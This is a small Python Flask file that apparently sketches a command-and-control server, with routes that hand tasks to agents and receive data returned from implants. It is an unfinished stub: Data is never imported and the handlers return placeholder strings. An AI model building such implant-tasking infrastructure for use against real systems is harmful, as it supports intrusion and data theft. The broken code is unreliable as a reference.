from flask import Flask
from task import Task

app = Flask(__name__)


# Task Handler.
@app.route('/task/<sget>/<agent_id>', methods=['GET', 'POST'])
def task_handler(sget, agent_id):
    task = Task(agent_id)
    if sget == "get":
        return task.get()

    task.set()

    return "error?"


# new agent/agent awake.

# data returned from implant
@app.route("/ret/<sget>/<agent_id>", methods=['post'])
def return_data(sget, agent_id):
    data = Data(agent_id)
    # client will GET there data
    if sget == "get":
        return ""
    # implant will SET the data.

    return ""


if __name__ == "__main__":
    app.run()
